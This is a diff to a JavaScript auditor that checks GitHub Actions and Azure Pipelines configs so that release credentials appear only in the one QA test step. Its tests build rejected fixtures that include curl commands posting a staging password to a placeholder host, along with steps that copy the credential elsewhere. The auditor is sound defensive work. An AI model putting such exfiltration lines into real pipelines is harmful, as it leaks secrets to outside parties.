@@ -75,6 +75,45 @@ function githubReleaseGateOk(jobs) {
 // The gated jobs inherit the gate through `needs`; any `if:` of their own (`always()`, `!cancelled()`) could run them with `release` skipped.
 const githubJobHasOwnIf = job => /^    if:/m.test(job.source);
 
+// Even inside its own gated job or stage, a credential may appear in exactly one place: the `env:` block of the single step that runs
+// `qa.mjs test`, as `NAME: <its own secret>`. A second step, a `run:`/`script:` body, `with:`, a job-level `env:` or a variables entry that
+// names a credential could send it away, so every other occurrence fails. Comment-only lines are ignored.
+const indentOf = line => line.length - line.trimStart().length;
+const stepRange = (lines, at) => {
+  let start = at;
+  while (start > 0 && !/^\s*- /.test(lines[start])) start -= 1;
+  const indent = indentOf(lines[start]);
+  let end = start + 1;
+  while (end < lines.length && (lines[end].trim() === '' || indentOf(lines[end]) > indent)) end += 1;
+  return [start, end];
+};
+
+function credentialStepViolations(label, source, ownNames, mapping) {
+  const lines = source.split('\n');
+  const testLines = lines.map((line, index) => (/qa\.mjs\s+test\b/.test(line) && !line.trim().startsWith('#') ? index : -1)).filter(index => index >= 0);
+  const allowed = new Set();
+  if (testLines.length === 1) {
+    const [start, end] = stepRange(lines, testLines[0]);
+    for (let i = start; i < end; i += 1) {
+      const hit = [...ownNames].find(name => mapping(name).test(lines[i]));
+      if (!hit) continue;
+      let up = i - 1;
+      while (up >= start && indentOf(lines[up]) >= indentOf(lines[i])) up -= 1;
+      if (up >= start && /^\s*env:\s*$/.test(lines[up])) allowed.add(i);
+    }
+  }
+  const violations = [];
+  lines.forEach((line, index) => {
+    if (allowed.has(index) || line.trim().startsWith('#')) return;
+    for (const name of credentialNames) {
+      if (new RegExp(`\\b${name}\\b`).test(line)) violations.push(`${label}: credential ${name} outside the env block of the single qa test step`);
+    }
+  });
+  return [...new Set(violations)];
+}
+const githubMapping = name => new RegExp(`^\\s+${name}:\\s*\\$\\{\\{\\s*secrets\\.${name}\\s*\\}\\}\\s*$`);
+const azureMapping = name => new RegExp(`^\\s+${name}:\\s*\\$\\(${name}\\)\\s*$`);
+
 function githubCredentialJobAllowed(jobs, job) {
   const rule = GITHUB_RELEASE_JOBS[job.name];
   if (!rule) return false;
@@ -97,6 +136,7 @@ function auditGithub(source) {
     const own = GITHUB_RELEASE_JOBS[job.name] ? credentialsOf(GITHUB_RELEASE_JOBS[job.name].config) : new Set();
     const eligible = githubCredentialJobAllowed(jobs, job);
     let scanned = job.source;
+    if (eligible) violations.push(...credentialStepViolations(`github:${job.name}`, job.source, own, githubMapping));
     for (const [, name] of job.source.matchAll(/\$\{\{\s*secrets\.(\w+)\s*\}\}/g)) {
       if (!credentialNames.has(name)) continue;
       if (eligible && own.has(name)) scanned = scanned.replace(new RegExp(`\\$\\{\\{\\s*secrets\\.${name}\\s*\\}\\}`, 'g'), '');
@@ -153,7 +193,9 @@ function auditAzureCredentials(source) {
   for (const stage of stages) {
     const own = AZURE_RELEASE_STAGES[stage.name] ? credentialsOf(AZURE_RELEASE_STAGES[stage.name].config) : new Set();
     const allowed = azureCredentialStageAllowed(stages, stage);
+    if (allowed) violations.push(...credentialStepViolations(`azure:${stage.name}`, stage.source, own, azureMapping));
     for (const name of credentialNames) {
+      if (allowed && own.has(name)) continue;
       if (!new RegExp(`\\b${name}\\b`).test(stage.source)) continue;
       if (!(allowed && own.has(name))) violations.push(`azure:${stage.name}: credential variable ${name} outside its own release stage`);
     }
@@ -244,6 +286,43 @@ test('GitHub audit rejects a credential secret anywhere but its own gated releas
   for (const [name, yaml] of Object.entries(fixtures)) {
     const violations = auditGithub(yaml);
     assert.ok(violations.length > 0, `rejected: ${name}`);
+  }
+});
+
+test('GitHub audit rejects a second step in the release job that can send a credential away', () => {
+  const mutate = (from, to) => { assert.ok(githubYaml.includes(from), from); return githubYaml.replace(from, to); };
+  const beforeProduction = extra => mutate('  production:\n    needs: staging\n', `${extra}  production:\n    needs: staging\n`);
+  const fixtures = {
+    'a second step with the credential in its own env': beforeProduction('      - run: ./notify.sh\n        env:\n          QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}\n'),
+    'a second step with the secret inline in its run': beforeProduction('      - run: curl -d "${{ secrets.QA_STAGING_PASSWORD }}" https://example.invalid\n'),
+    'a second step that posts the mapped variable': beforeProduction('      - run: curl -d "$QA_STAGING_PASSWORD" https://example.invalid\n        env:\n          QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}\n'),
+    'a second step passing the user through with': beforeProduction('      - uses: example/notify@v1\n        with:\n          token: ${{ secrets.QA_STAGING_USER }}\n'),
+    'a job-level env mapping': mutate('    environment: STAGING\n    steps:\n', '    environment: STAGING\n    env:\n      QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}\n    steps:\n'),
+    'the qa test step run also posting the password': mutate('--base-url "$STAGING_URL"\n', '--base-url "$STAGING_URL" && curl -d "$QA_STAGING_PASSWORD" https://example.invalid\n'),
+    'two qa test steps': beforeProduction('      - run: node qa-authority/qa/bin/qa.mjs test --tier release-smoke --env staging --base-url "$STAGING_URL"\n        env:\n          QA_STAGING_PASSWORD: ${{ secrets.QA_STAGING_PASSWORD }}\n'),
+    'the mapping moved out of the env block into the step with': mutate('        env:\n          CI: \'true\'\n          QA_STAGING_USER:', '        with:\n          CI: \'true\'\n          QA_STAGING_USER:'),
+  };
+  for (const [name, yaml] of Object.entries(fixtures)) {
+    assert.ok(auditGithub(yaml).length > 0, `rejected: ${name}`);
+  }
+});
+
+test('Azure audit rejects a second step in the release stage that can send a credential away', () => {
+  const mutate = (from, to) => { assert.ok(azureYaml.includes(from), from); return azureYaml.replace(from, to); };
+  const beforeProd = extra => mutate('- stage: PROD\n', `${extra}- stage: PROD\n`);
+  const stagingStep = extra => mutate('              QA_STAGING_PASSWORD: $(QA_STAGING_PASSWORD)\n', `              QA_STAGING_PASSWORD: $(QA_STAGING_PASSWORD)\n${extra}`);
+  const fixtures = {
+    'a second step with the credential in its own env': stagingStep('          - script: ./notify.sh\n            env:\n              QA_STAGING_PASSWORD: $(QA_STAGING_PASSWORD)\n'),
+    'a second step with the variable inline in its script': stagingStep('          - script: curl -d "$(QA_STAGING_PASSWORD)" https://example.invalid\n'),
+    'a second step that posts the mapped variable': stagingStep('          - script: curl -d "$QA_STAGING_PASSWORD" https://example.invalid\n            env:\n              QA_STAGING_PASSWORD: $(QA_STAGING_PASSWORD)\n'),
+    'a stage variable that copies the credential': mutate('  - group: qa-staging-credentials\n', '  - group: qa-staging-credentials\n  - name: copy\n    value: $(QA_STAGING_PASSWORD)\n'),
+    'a job-level variable that copies the credential': mutate('    environment: STAGING\n', '    variables:\n      copy: $(QA_STAGING_PASSWORD)\n    environment: STAGING\n'),
+    'the qa test script also posting the password': mutate('--base-url "$(STAGING_URL)"\n', '--base-url "$(STAGING_URL)" && curl -d "$QA_STAGING_PASSWORD" https://example.invalid\n'),
+    'two qa test steps': stagingStep('          - script: node qaAuthority/qa/bin/qa.mjs test --env staging --base-url "$(STAGING_URL)"\n            env:\n              QA_STAGING_PASSWORD: $(QA_STAGING_PASSWORD)\n'),
+  };
+  assert.ok(beforeProd);
+  for (const [name, yaml] of Object.entries(fixtures)) {
+    assert.ok(auditAzure(yaml).length > 0, `rejected: ${name}`);
   }
 });
 
